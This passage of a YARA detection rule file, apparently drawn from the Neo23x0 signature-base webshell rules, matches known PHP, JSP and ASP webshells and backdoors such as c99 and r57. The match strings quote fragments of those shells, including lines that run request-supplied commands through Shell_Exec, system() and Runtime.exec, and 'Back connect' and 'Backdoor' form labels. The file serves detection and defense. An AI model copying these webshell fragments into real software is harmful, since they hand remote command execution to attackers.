		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ae46cb97-1ff8-50ba-856f-c38fbb1e5163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4720-L4731"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
		logic_hash = "6e2ff262aecd08e5feaa274a7fd128d75565d6cc03341da7cbeb2949070705e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "$dl=$_REQUEST['downloaD'];"
		$s4 = "else shelL(\"perl.exe $name $port\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cgi_Python_Py
{
	meta:
		description = "Semi-Auto-generated  - file cgi-python.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "75e99d10-3cdf-5f87-9933-4ce5ebe18b09"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4745-L4757"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0a15f473e2232b89dae1075e1afdac97"
		logic_hash = "37c6c7db32a52c8a83ff85f0a50c6fa71e833b9e6d20b1f95e9512fe8bbd0aee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "a CGI by Fuzzyman"
		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ru24_Post_Sh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "78669d3e-629b-591a-a766-923e37d1fdba"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4758-L4770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b334d494564393f419af745dc1eeec7"
		logic_hash = "e81e5345bbe07ca85c94a3d8411f0dd3c418689ccae7115c098f718f9093b3bf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
		$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s4 = "Writed by DreAmeRz" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dtool_Pro_Php
{
	meta:
		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c02c522c-8418-5760-869a-52b41785bebc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4771-L4783"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "366ad973a3f327dfbfb915b0faaea5a6"
		logic_hash = "e8f8b4ca2ab4607e700e897671fd230280763a70897b8ccfc31b3bcb7f2a1f4a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "r3v3ng4ns\\nDigite"
		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Include_W_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ddcf9031-2ec8-5a86-8326-60e4a699f494"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4799-L4810"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4e913f159e33867be729631a7ca46850"
		logic_hash = "a63910d97b7ef447b2cadb7de12943d3dbb6eada27d3097b8acf58d9b65b6f60"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Safe0Ver_Shell__Safe_Mod_Bypass_By_Evilc0Der_Php
{
	meta:
		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "25971f62-33ee-5ed6-8d72-118be5bd2deb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4811-L4823"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6163b30600f1e80d2bb5afaa753490b6"
		logic_hash = "46f6bb38f1175e02b03047c06a7aed968b1c1ce2e28cc4b88e15703040e91592"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Safe0ver" fullword
		$s1 = "Script Gecisi Tamamlayamadi!"
		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4824-L4836"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1a95f0163b6dea771da1694de13a3d8d"
		logic_hash = "dbd08e71dc512f8dcf009150fb4448cd3608291ef9078c7e6b86e6f8d820bd94"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
		$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
		$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Telnet_Cgi
{
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ca3dace-cd80-58e4-a4de-47dcc64dac0e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4837-L4849"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dee697481383052980c20c48de1598d1"
		logic_hash = "689c1d43c64aa7469989686c60fc9ab46acde42fdf3c1157bae1e2b8373c845f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ironshell_Php
{
	meta:
		description = "Semi-Auto-generated  - file ironshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0d63ad03-4d1d-535f-8afe-3edaf1bf4010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4850-L4864"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		logic_hash = "23574299ee2bb33c3f71102adf71ac8f09b6f8ece5f798beacb9b2432d297ee7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "www.ironwarez.info"
		$s1 = "$cookiename = \"wieeeee\";"
		$s2 = "~ Shell I"
		$s3 = "www.rootshell-team.info"
		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Backdoorfr_Php
{
	meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5ba2b617-a873-5e80-9cfc-c61cc8d605f3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4865-L4876"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
		logic_hash = "40a6fb41a65fd35acb7cdc36fdda90f5dc54b641adc3ba9eaae29c5e46622206"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmdjsp_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "048478a8-9622-54c7-80ed-e4e223d14500"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4891-L4904"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b815611cc39f17f05a73444d699341d4"
		logic_hash = "8b0e425c7d71ea2c536192ff186665e7f0fbdbc0e0d195d7107ac57cf9bd1773"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s2 = "cmdjsp.jsp"
		$s3 = "michaeldaw.org" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_H4Ntu_Shell__Powered_By_Tsoi_
{
	meta:
		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "186358e6-88a3-5fad-b1ba-a49b2a5dea1c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4905-L4916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		logic_hash = "32c620a4ed3f7a8640928e2211516978c12cfbdedb7d96e923303740407b5a1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "h4ntu shell"
		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ajan_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Ajan.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6040fd88-b992-5110-8b37-7711ace30b1a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4917-L4929"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b6f468252407efc2318639da22b08af0"
		logic_hash = "13988af864a62ca04501288d4f2d830815ab453b14cef6795fe993db1dd1a9ef"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "c:\\downloaded.zip"
		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
		$s3 = "http://www35.websamba.com/cybervurgun/"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHANTASMA_Php
{
	meta:
		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "21ff4cee-9cdc-57d1-9c43-e033fdb47de0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4930-L4943"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "52779a27fa377ae404761a7ce76a5da7"
		logic_hash = "d4a2a1bcc1ff3264b35f2b05d7de664b56807977f2a793fd87206f046a185d3b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ">[*] Safemode Mode Run</DIV>"
		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
		$s2 = "[*] Spawning Shell"
		$s3 = "Cha0s"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Web_Interface_Version_0_8_Php
{
	meta:
		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "90616d2d-082b-5983-a859-62d1c5b8066e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4944-L4957"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		logic_hash = "f0a20870a3240948e3ef1ad61685b00c5fc90d6098b87af9ac43ab44ccd13c9e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Cmd_Html
{
	meta:
		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "30990574-02a0-5eed-8317-847b6be13300"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4958-L4971"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c6381412df74dbf3bcd5a2b31522b544"
		logic_hash = "56b5b9e5518fa8a4be8c48735e997a538b0e534ad8fd72c1419dc0e8353bbc00"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>G-Security Webshell</title>" fullword
		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__1_C2007_Php_Php_C100_Php
{
	meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "00ada6a4-a32a-5184-867d-e10a8c95c41c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4972-L4986"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6f6cb7c210bcd0f84c2ccff52850b1d673622ae49b83d614d63b5bbba7392327"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"

	condition:
		1 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Img_Php_Php_Nstview_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "238242f5-4e57-5edb-8806-ea5e06f1f637"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4987-L5002"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b1e13f75edbbc8f9263e0e516a54330ce57190ba0b45813dad4bafeaeefa389b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash2 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"

	condition:
		1 of them
}

rule SIGNATURE_BASE__Network_Php_Php_Xinfo_Php_Php_Nfm_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4fd11db6-902d-5f1a-96c5-9dfcccce7488"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5003-L5017"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "913ff19b6448d3b074440c2a5f85d85813fdf010d33dc57c89ba1e5db6455e11"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
		hash1 = "2601b6fc1579f263d2f3960ce775df70"
		hash2 = "401fbae5f10283051c39e640b77e4c26"

	strings:
		$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
		$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"

	condition:
		all of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5018-L5033"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a4bae5456baf0d8d894165c84d66118f2b16cfc040e299c2032eccb6a9eb4822"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5034-L5051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0df3e00f752f85aa1f150c01e3ef41b9a5cd3d3ce2060965992320cb3c4d87ae"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "8023394542cddf8aee5dec6072ed02b5"
		hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash5 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
		$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"

	condition:
		1 of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_Sses_Php_Php_Ctt_Sh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5052-L5068"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "137f98b636ec012d7d5e687f7d24ae88e8d3261360e60a4bbc03da248cce381e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
		$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
		$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d287136c-534b-51a4-88fc-40ef9f22d910"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5069-L5083"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "09892789e8dad16f9fc7c4e22525e5d0af3af401a4b2655b70f7a6856888875c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_C99_Generic
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5084-L5104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "422bc3a0d9b04b1e37ad954faacb1ec7841fe529c1eb19634bdbfe83da374c73"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
		hash6 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
		$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
		$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
		$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"

	condition:
		all of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5105-L5122"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b133cf947476a1c94ed90b5cd3757ca8aa429be4284d75664625896d9cfa687f"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php
{
	meta:
